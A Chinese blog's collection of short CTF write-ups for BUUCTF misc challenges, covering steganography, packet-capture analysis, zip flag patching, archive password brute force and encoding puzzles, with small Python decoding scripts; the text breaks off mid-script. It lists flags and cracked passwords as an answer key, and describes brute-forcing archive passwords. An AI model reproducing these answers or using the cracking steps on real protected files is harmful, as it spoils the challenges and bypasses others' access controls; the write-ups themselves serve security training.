<h1 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h1><p>右键查看属性，flag在备注中</p>
<blockquote>
<p>flag{870c5a72806115cb5439345d8b014396}</p>
</blockquote>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>流量分析题<br>根据提示找到管理员的密码</p>
<p>使用<code>wireshark</code>打开，因为是登陆网站的一段流量包，所以在过滤器中搜索http，然后找到登录的<code>user.php</code>，找到密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page1-3.png"></p>
<blockquote>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
</blockquote>
<h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>题目名为<code>LSB</code>，应为LSB隐写</p>
<p>用<code>stegsolve</code>打开，在<code>red，Green，Blue</code>的<code>0</code>通道中发发现一张png的数据<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page1-4.png"></p>
<p>导出后是一张二维码，扫码得到flag</p>
<blockquote>
<p>flag{1sb_i4_s0_Ea4y}</p>
</blockquote>
<h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p>又是4位数字爆破，<code>8795</code></p>
<blockquote>
<p>flag{1773c5da790bd3caff38e3decd180eb7}</p>
</blockquote>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>如题，修改压缩文件区的加密标志位，改为<code>00</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page1-5.png"></p>
<blockquote>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
</blockquote>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p>扫码得到flag</p>
<blockquote>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
</blockquote>
<h1 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h1><p>追踪TCP数据流，发现上传了一张<code>flag.jpg</code>，在图片数据尾发现flag</p>
<blockquote>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
</blockquote>
<h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h1><p><code>stegsolve</code>发现<code>0</code>通道中有异常数据，提取出来发现一串字符串<code>Hey I think we can write  safely in this  file without any one seeing it. Any way, the secret key is: st3g0_saurus_wr3cks</code></p>
<blockquote>
<p>flag{st3g0_saurus_wr3cks}</p>
</blockquote>
<h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p><code>foremost</code>分离出一个zip，根据提示进行四位数爆破，<code>8368</code></p>
<blockquote>
<p>flag{b025fc9ca797a67d2103bfbc407a6d5f}</p>
</blockquote>
<h1 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h1><p><code>foremost</code>分离出一个rar，根据提示进行四位数爆破，<code>7869</code></p>
<blockquote>
<p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p>
</blockquote>
<h1 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h1><p><code>foremost</code>分离出一个zip，密码在图片属性中<code>this_is_not_password</code></p>
<blockquote>
<p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p>
</blockquote>
<h1 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h1><p>追踪TCP流</p>
<blockquote>
<p>flag{385b87afc8671dee07550290d16a8071}</p>
</blockquote>
<h1 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h1><p><code>strings</code>得到<code>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</code></p>
<blockquote>
<p>flag{377cbadda1eca2f2f73d36277781f00a}</p>
</blockquote>
<h1 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h1><p>将文件尾的<code>01101011 01101111 01100101 01101011 01101010 00110011 01110011</code>转成字符串</p>
<blockquote>
<p>flag{koekj3s}</p>
</blockquote>
<h1 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h1><p>使用<code>stegsolve</code>在<code>0</code>通道中发现<code>zip</code>数据<br>提取后会发现提示文件已损坏，将结尾处没用的数据删除就可以了<br>解压得到一个<code>ELF</code>文件，运行得到flag</p>
<blockquote>
<p>flag{dd0gf4c3tok3yb0ard4g41n~~~}</p>
</blockquote>
<h1 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h1><p>图片下有盲文，百度找个盲文表对一下，得到<code>kmdonowg</code><br>使用<code>audacity</code>分析音频，发现摩斯<code>-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</code></p>
<p>解摩斯得到flag</p>
<blockquote>
<p>flag{wpei08732?23dz}</p>
</blockquote>
<h1 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h1><p>四位数字爆破，<code>5463</code><br>得到一串<code>brainfuck</code>字符串<br>解码得到flag</p>
<blockquote>
<p>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p>
</blockquote>
<h1 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h1><p>用河马查杀，D盾或者手动查看<br>找到<code>include\include.php</code></p>
<blockquote>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
</blockquote>
<h1 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h1><p>过滤器筛选<code>HTTP</code>包，发现一段base64加密后的数据，解密后是一张jpg</p>
<blockquote>
<p>flag{209acebf6324a09671abc31c869de72c}</p>
</blockquote>
<h1 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h1><p>路由器配置文件<br>使用<code>RouterPassView</code>打开，搜索<code>useranme</code></p>
<blockquote>
<p>flag{053700357621}</p>
</blockquote>
<h1 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h1><p><code>audacity</code>分析音频，发现左声道有摩斯</p>
<p><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. </code></p>
<blockquote>
<p>flag{5BC925649CB0188F52E617D70929191C}</p>
</blockquote>
<h1 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h1><p><code>D盾</code>查杀，发现<code>member\zp.php</code></p>
<blockquote>
<p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p>
</blockquote>
<h1 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h1><p><code>foremost</code>分离出一个zip，伪加密，将加密标志位改为<code>00</code>，得到一个<code>vmdk</code>文件，但是这个文件很小，只有<code>3MB</code>，所以不太可能需要挂载</p>
<p>kail下使用7z解压<code>7z x flag.vmdk -o/root/flag</code>，得到<code>key_part_one</code>和<code>key_part_two</code></p>
<p>分别进行<code>brainfuck</code>和<code>ook</code>解码</p>
<blockquote>
<p>flag{N7F5_AD5_i5_funny!}</p>
</blockquote>
<h1 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h1><p><code>foremost</code>分离出一个zip，伪加密，将加密标志位改为<code>00</code>，得到一张jpg，使用<code>steghide</code>空密码解密，得到密码<code>bV1g6t5wZDJif^J7</code>，解压压缩包得到flag</p>
<blockquote>
<p>flag{1RTo8w@&amp;4nK@z*XL}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】misc-page2</title>
    <url>/buuctf/%E3%80%90buuctf%E3%80%91misc-page2.html</url>
    <content><![CDATA[<h1 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h1><p>过滤器筛选http流量，在<code>index.php</code>的post参数中找到账号和密码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-1.png"></p>
<blockquote>
<p>flag{1d240aafe21a86afc11f38a45b541a49}</p>
</blockquote>
<h1 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h1><p>根据题目名，锁定F5隐写</p>
<p><code>java Extract Misc.jpg</code></p>
<p>得到一个伪加密后的压缩包</p>
<blockquote>
<p>flag{96efd0a2037d06f34199e921079778ee}</p>
</blockquote>
<h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>foremost分离出一个压缩包，解压得到<code>ciphey</code>和<code>key</code><br>key文件中的内容base64解密得到<code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code><br>百度搜索得到<code>anaconda</code></p>
<p>serpent解密得到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-2.png"></p>
<blockquote>
<p>flag{who_knew_serpent_cipher_existed}</p>
</blockquote>
<h1 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h1><p>一个xls文件，实际是个压缩包，将后缀改为zip解压<br>在<code>xl\charts</code>下得到flag.txt</p>
<blockquote>
<p>flag{M9eVfi2Pcs#‌‌‌‌‍‬}</p>
</blockquote>
<h1 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h1><p>foremost分离出一个压缩包，解压得到docx，里面有张二维码，扫码得到flag</p>
<blockquote>
<p>flag{you are the best!}</p>
</blockquote>
<h1 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h1><p>追踪流可以发现使用ftp的<code>retr</code>命令下载了一个<code>flag.rar</code></p>
<p>转成原始数据后另存为</p>
<p>使用<code>archpr</code>爆破得到密码<code>5790</code>，解压得到flag.txt</p>
<blockquote>
<p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p>
</blockquote>
<h1 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h1><p>伪加密，得到<code>佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸</code></p>
<p>佛曰解密得到flag</p>
<blockquote>
<p>flag{w0_fo_ci_Be1}</p>
</blockquote>
<h1 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h1><p>下载得到一个zip，但是实际上是一个png</p>
<p>改成png后打开得到一个二维码，扫码得到<code>flag祥婓涴</code>,是假的flag，真的在png文件尾</p>
<blockquote>
<p>flag{i_am_fl@g}</p>
</blockquote>
<h1 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h1><p>http流量分析<br>先在z2参数中提取出一张jpg，得到密码：<code>Th1s_1s_p4sswd_!!!</code><br>再从上传的数据包中提取出一个zip<br>解压得到flag</p>
<blockquote>
<p>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</p>
</blockquote>
<h1 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h1><p>与<code>被偷走的文件</code>这题步骤一致</p>
<blockquote>
<p>flag{d72e5a671aa50fa5f400e5d10eedeaa5}</p>
</blockquote>
<h1 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h1><p>图片尾发现一串十六进制字符，转成ascii码，发现全是(x,x)的形式<br>猜测为坐标，使用<code>gnuplot</code>画图</p>
<p>注意坐标的格式为<code>x[空格]x</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-3.png"></p>
<p>扫码得到flag</p>
<blockquote>
<p>flag{40fc0a979f759c8892f4dc045e28b820}</p>
</blockquote>
<h1 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h1><p>四位数暴力破解，口令<code>2016</code><br>解压得到一张jpg，在属性中得到flag</p>
<blockquote>
<p>flag{Wadf_123}</p>
</blockquote>
<h1 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h1><p>解压后得到两个gif文件，一个gif文件头被修改了<br>修复后可以直接看到flag了<br>注意不是短杠是下划线</p>
<blockquote>
<p>flag{zhi_yin_you_are_beautiful}</p>
</blockquote>
<h1 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h1><p>修改高度</p>
<blockquote>
<p>flag{66666}</p>
</blockquote>
<h1 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h1><p>binwalk分离出四个压缩包,有俩个无用的干扰项<br>在其中一个doc中得到解压密码<code>comEON_YOuAreSOSoS0great</code><br>解压后是一个<code>good.mp3</code>，<code>audacity</code>分析发现摩斯</p>
<p><code>-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</code></p>
<blockquote>
<p>flag{morseisveryveryeasy}</p>
</blockquote>
<h1 id="BJDCTF2020-纳尼"><a href="#BJDCTF2020-纳尼" class="headerlink" title="[BJDCTF2020]纳尼"></a>[BJDCTF2020]纳尼</h1><p>修复文件头，再将每一帧分离出图片，拼接字符串后base64解密得到flag</p>
<blockquote>
<p>flag{wang_bao_qiang_is_sad}</p>
</blockquote>
<h1 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h1><p>还是摩斯</p>
<p>第一段：<code>F029BD6F551139EEDEB8E45A175B0786</code><br>第二段：<code>F029BD6F5</code></p>
<blockquote>
<p>flag{f029bd6f551139eedeb8e45a175b0786}</p>
</blockquote>
<h1 id="ACTF新生赛2020-outguess"><a href="#ACTF新生赛2020-outguess" class="headerlink" title="[ACTF新生赛2020]outguess"></a>[ACTF新生赛2020]outguess</h1><p>outguess隐写<br>密码在图片属性中<br><code>outguess -r mmm.jpg -t asd -k abc</code></p>
<blockquote>
<p>flag{gue33_Gu3Ss!2020}</p>
</blockquote>
<h1 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h1><p>看似爆破，实际string</p>
<blockquote>
<p>flag{office_easy_cracked}</p>
</blockquote>
<h1 id="谁赢了比赛？"><a href="#谁赢了比赛？" class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h1><p>binwalk分解出一个rar<br>暴力破解出密码<code>1020</code><br>将的得到的gif放在stegsolve分析<br>在第310帧处发现不一样的图片,另存为<br>再将这个图片进行lsb隐写分析<br>在r0通道发现一张二维码<br>扫码得到flag</p>
<blockquote>
<p>flag{shanxiajingwu_won_the_game}</p>
</blockquote>
<h1 id="SWPU2019-我有一只马里奥"><a href="#SWPU2019-我有一只马里奥" class="headerlink" title="[SWPU2019]我有一只马里奥"></a>[SWPU2019]我有一只马里奥</h1><p>运行exe后生成了一段txt文本</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ntfs<br>flag.txt<br></code></pre></td></tr></table></figure>

<p>很明显是ntfs流</p>
<p>使用<code>ntfsstreamseditor</code>处理</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-4.png"></p>
<p>也可以使用notepad命令来打开隐藏的文件<br><code>notepad 1.txt:flag.txt</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-5.png"></p>
<blockquote>
<p>flag{ddg_is_cute}</p>
</blockquote>
<h1 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h1><p>摩斯<code>.- .-.. .--. .... .- .-.. .- -...</code></p>
<blockquote>
<p>flag{alphalab}</p>
</blockquote>
<h1 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h1><p>binwalk分离出一个带密码的rar<br>爆破出密码为<code>8864</code></p>
<p>观察字符串的特征，不像各种编码，尝试词频分析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;file.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f_read=f.read()<br><br><br><span class="hljs-built_in">print</span> Counter(f_read)<br>a=<span class="hljs-built_in">sorted</span>(Counter(f_read).items(),key=<span class="hljs-keyword">lambda</span> d:d[<span class="hljs-number">1</span>],reverse=<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a])<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-6.png"></p>
<blockquote>
<p>flag{gaki_IsMyw1fe}</p>
</blockquote>
<h1 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h1><p>图片属性备注中有盲文<br>解密得到flag</p>
<blockquote>
<p>flag{y$0$u_f$1$n$d$_M$e$e$e$e$e}</p>
</blockquote>
<h1 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h1><p>base64隐写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64解码脚本，Python2 运行</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># 2.txt为需要解码的文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <span class="hljs-comment">#8位一组</span><br></code></pre></td></tr></table></figure>


<blockquote>
<p>flag{6aseb4_f33!}</p>
</blockquote>
<h1 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h1><p>修改txt中内容的编码为<code>EBCDIC</code><br>得到密码<code>wllm_is_the_best_team!</code></p>
<p>对着跳舞小人密码表解密得到flag</p>
<blockquote>
<p>flag{iloveholmesandwllm}</p>
</blockquote>
<h1 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h1><p>ook编码</p>
<blockquote>
<p>flag{welcome to CTF}</p>
</blockquote>
<h1 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h1><p>开头是<code>52 61 72 21 1a 07 00</code>，是rar的文件头，保存为rar<br>暴力破解得到密码<code>3690</code></p>
<p>解压得到一个后缀为png的文件，但是在十六进制下观察可以发现实际上是jpg文件，头前四个字节被修改成<code>89 50 4e 47</code>了。改成<code>ff d8 ff e0</code>即可</p>
<p>flag在修好后的图片上</p>
<blockquote>
<p>flag{57cd4cfd4e07505b98048ca106132125}</p>
</blockquote>
<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>修改高度</p>
<blockquote>
<p>flag{1ts_vEryyyyyy_ez!}</p>
</blockquote>
<h1 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h1><p>文件头被改，修改回正确的<code>52 61 72</code><br>解压得到一个docx，改后缀为zip并解压</p>
<p>在<code>document.xml</code>中得到字符串<code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code></p>
<p>音符解码得到flag</p>
<blockquote>
<p>flag{thEse_n0tes_ArE_am@zing~}</p>
</blockquote>
<h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>sql注入的流量</p>
<p>先用tshark把注入流量导出来</p>
<p><code>tshark -r sqltest.pcapng -Y &quot;http.request&quot; -T fields -e http.request.full_uri &gt; data.txt</code></p>
<blockquote>
<p>-r 读取文件<br>-Y 过滤语句<br>-T pdml|ps|text|fields|psml,设置解码结果输出的格式<br>-e 输出特定字段<br>http.request.uri http请求的uri部分</p>
</blockquote>
<p>提取字段的ascii值，再把ascii转成字符串</p>
<blockquote>
<p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p>
</blockquote>
<blockquote>
<p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
</blockquote>
<h1 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h1><p>键盘密码，在键盘上画出来即可</p>
<blockquote>
<p>flag{CTF}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】misc-page3</title>
    <url>/buuctf/%E3%80%90buuctf%E3%80%91misc-page3.html</url>
    <content><![CDATA[<h1 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h1><p>凯撒加密，枚举一下得到flag</p>
<blockquote>
<p>flag{flagiscaesar}</p>
</blockquote>
<h1 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h1><p>解压得到flag2.zip和flag3.zip<br>flag3.zip的注释中提示了6位数字爆破，<code>183792</code><br>得到flag.docx和影 流 之 主.mp4</p>
<p>通过<code>docx</code>中的hint<code>5.20</code>和<code>7.11</code>发现<br><code>mp4</code>的<code>5.67</code>秒存在敲击码<code>..... ../... ./... ./... ../</code>，<code>7.37</code>秒存在字符串<code>dXBfdXBfdXA=</code></p>
<p>解密得到<code>wllmup_up_up</code></p>
<p>flag在解压出的图片尾部</p>
<blockquote>
<p>flag{A2e_Y0u_Ok?}</p>
</blockquote>
<h1 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h1><p>binwalk分离出一个txt，<code>aaencode</code>解密得到flag</p>
<blockquote>
<p>flag{happy double eleven}</p>
</blockquote>
<h1 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h1><p>flag藏在两张图片的中间，base64解一下即可</p>
<blockquote>
<p>flag{6f1797d4080b29b64da5897780463e30}</p>
</blockquote>
<h1 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h1><p>ntfs流隐写</p>
<blockquote>
<p>flag{AAAds_nntfs_ffunn?}</p>
</blockquote>
<h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h1><p>先将所有图片提取出来，stegsolve观察其中一张时发现flag</p>
<blockquote>
<p>flag{J0hn_th3_Sn1ff3r}</p>
</blockquote>
<h1 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h1><h1 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h1><p>foremost分离<code>wget.pcapng</code>，得到一个伪加密的压缩包，7-zip直接解压，虽然提示失败但还是会得到一个<code>.flag.swp</code></p>
<blockquote>
<p>flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
</blockquote>
<h1 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h1><p>base64流加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64解码脚本，Python2 运行</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># 2.txt为需要解码的文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span 